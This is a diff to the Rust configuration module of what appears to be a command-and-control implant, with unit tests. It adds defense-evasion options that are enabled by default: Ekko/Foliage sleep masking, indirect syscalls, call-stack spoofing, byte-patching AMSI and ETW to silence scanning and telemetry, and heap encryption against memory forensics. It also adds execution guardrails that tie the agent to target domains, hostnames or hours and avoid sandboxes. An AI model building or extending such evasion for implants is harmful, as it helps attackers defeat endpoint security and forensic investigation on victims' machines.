@@ -220,6 +220,10 @@ fn default_dga_count()        -> u32         { 16 }
 fn default_dga_tlds()         -> Vec<String> { vec!["com".into(), "net".into(), "org".into()] }
 fn default_dga_max_failures() -> u32         { 3 }
 
+// ── Evasion / guardrail defaults ─────────────────────────────────────────────
+
+fn default_sleep_mask() -> String { "ekko".into() }
+
 // ─────────────────────────────────────────────────────────────────────────────
 
 #[derive(Serialize, Deserialize, Debug, Clone)]
@@ -295,6 +299,79 @@ pub struct C2Config {
     /// list is empty, so existing configs need no changes.
     #[serde(default)]
     pub valid_parents: Vec<String>,
+
+    // ── Evasion ───────────────────────────────────────────────────────────────
+    //
+    // All evasion fields default to the most aggressive safe values so that
+    // legacy configs (built before this feature existed) get full evasion
+    // without any config migration.
+
+    /// Sleep masking algorithm to use during beacon sleep windows.
+    /// "ekko"    — Ekko ROP-based timer-masked sleep (Windows only; no-op on Linux).
+    /// "foliage" — Foliage APC-based sleep mask (Windows only; no-op on Linux).
+    /// "none"    — Plain Sleep/usleep; no masking.
+    #[serde(default = "default_sleep_mask")]
+    pub sleep_mask: String,
+
+    /// Use indirect syscall stubs (Heaven's Gate / SysWhispers-style) instead
+    /// of calling ntdll exports directly. Reduces userland hook surface.
+    /// Windows only; no-op on Linux/macOS.
+    #[serde(default = "default_true")]
+    pub indirect_syscalls: bool,
+
+    /// Spoof the thread call-stack to a plausible kernel32/ntdll frame chain
+    /// before every sleep, then restore it on wake. Defeats stack-walking
+    /// heuristics in memory scanners.
+    /// Windows only; no-op on Linux/macOS.
+    #[serde(default = "default_true")]
+    pub stack_spoof: bool,
+
+    /// Byte-patch AMSI (amsi.dll!AmsiScanBuffer) and ETW
+    /// (ntdll!EtwEventWrite) on startup to suppress scan and telemetry hooks.
+    /// Windows only; no-op on Linux/macOS.
+    #[serde(default = "default_true")]
+    pub patch_amsi_etw: bool,
+
+    /// Encrypt the process heap with AES-256-GCM while the agent is sleeping,
+    /// then decrypt on wake. Defeats heap-scanning memory forensics.
+    /// Windows only; no-op on Linux/macOS.
+    #[serde(default = "default_true")]
+    pub heap_encrypt: bool,
+
+    // ── Execution guardrails ──────────────────────────────────────────────────
+    //
+    // All guardrail fields default to permissive (empty / 0 / false) so that
+    // existing configs remain unaffected.
+
+    /// Glob pattern the AD domain name must match at runtime (case-insensitive).
+    /// e.g. "CORP*" or "*.example.com".
+    /// Empty string (default) disables the check — agent runs on any domain.
+    #[serde(default)]
+    pub guard_domain: String,
+
+    /// Glob pattern the machine hostname must match at runtime (case-insensitive).
+    /// e.g. "DESKTOP-*" or "WKS??".
+    /// Empty string (default) disables the check — agent runs on any hostname.
+    #[serde(default)]
+    pub guard_hostname: String,
+
+    /// Hour of day (0–23, local time) before which the agent must not run.
+    /// Together with `guard_hour_end` this forms an active-hours window.
+    /// Both 0 (default) disables the time-window check entirely.
+    #[serde(default)]
+    pub guard_hour_start: u8,
+
+    /// Hour of day (0–23, local time) after which the agent must not run.
+    /// Together with `guard_hour_start` this forms an active-hours window.
+    /// Both 0 (default) disables the time-window check entirely.
+    #[serde(default)]
+    pub guard_hour_end: u8,
+
+    /// When true the agent exits immediately if it detects it is running as
+    /// SYSTEM (Windows) or UID 0 / root (Linux/macOS). Useful for builds
+    /// that are not expected to be elevated and want to avoid sandbox traps.
+    #[serde(default)]
+    pub guard_no_system: bool,
 }
 
 // ... (Rest of common.rs remains the same: ClientHello, SecuredCommand, etc.)
@@ -482,6 +559,18 @@ mod tests {
         assert_eq!(config.tunnel_port, 4443);
         assert!(config.fallback.endpoints.is_empty());
         assert_eq!(config.fallback.strategy, FallbackStrategy::Priority);
+        // Evasion defaults: all on, sleep_mask = ekko
+        assert_eq!(config.sleep_mask, "ekko");
+        assert!(config.indirect_syscalls);
+        assert!(config.stack_spoof);
+        assert!(config.patch_amsi_etw);
+        assert!(config.heap_encrypt);
+        // Guardrail defaults: all permissive
+        assert!(config.guard_domain.is_empty());
+        assert!(config.guard_hostname.is_empty());
+        assert_eq!(config.guard_hour_start, 0);
+        assert_eq!(config.guard_hour_end, 0);
+        assert!(!config.guard_no_system);
     }
 
     #[test]
@@ -504,6 +593,53 @@ mod tests {
         assert_eq!(config.fallback.endpoints.len(), 2);
         assert_eq!(config.fallback.strategy, FallbackStrategy::RoundRobin);
         assert_eq!(config.fallback.endpoints[1].priority, 5);
+    }
+
+    #[test]
+    fn test_c2config_deserialize_evasion_and_guardrails() {
+        let json = r#"{
+            "transport": "tls",
+            "server_public_key": "k", "hash_salt": "s", "c2_host": "10.0.0.1",
+            "build_id": "b", "tunnel_port": 4443, "sleep_interval": 5,
+            "jitter_min": 0, "jitter_max": 0,
+            "sleep_mask": "foliage",
+            "indirect_syscalls": false,
+            "stack_spoof": false,
+            "patch_amsi_etw": false,
+            "heap_encrypt": false,
+            "guard_domain": "CORP*",
+            "guard_hostname": "DESKTOP-*",
+            "guard_hour_start": 8,
+            "guard_hour_end": 18,
+            "guard_no_system": true
+        }"#;
+        let config: C2Config = serde_json::from_str(json).unwrap();
+        assert_eq!(config.sleep_mask, "foliage");
+        assert!(!config.indirect_syscalls);
+        assert!(!config.stack_spoof);
+        assert!(!config.patch_amsi_etw);
+        assert!(!config.heap_encrypt);
+        assert_eq!(config.guard_domain, "CORP*");
+        assert_eq!(config.guard_hostname, "DESKTOP-*");
+        assert_eq!(config.guard_hour_start, 8);
+        assert_eq!(config.guard_hour_end, 18);
+        assert!(config.guard_no_system);
+    }
+
+    #[test]
+    fn test_c2config_evasion_none_sleep_mask() {
+        let json = r#"{
+            "transport": "tls",
+            "server_public_key": "k", "hash_salt": "s", "c2_host": "h",
+            "build_id": "b", "tunnel_port": 443, "sleep_interval": 5,
+            "jitter_min": 0, "jitter_max": 0,
+            "sleep_mask": "none"
+        }"#;
+        let config: C2Config = serde_json::from_str(json).unwrap();
+        assert_eq!(config.sleep_mask, "none");
+        // Other evasion fields still default to true
+        assert!(config.indirect_syscalls);
+        assert!(config.heap_encrypt);
     }
 
     #[test]
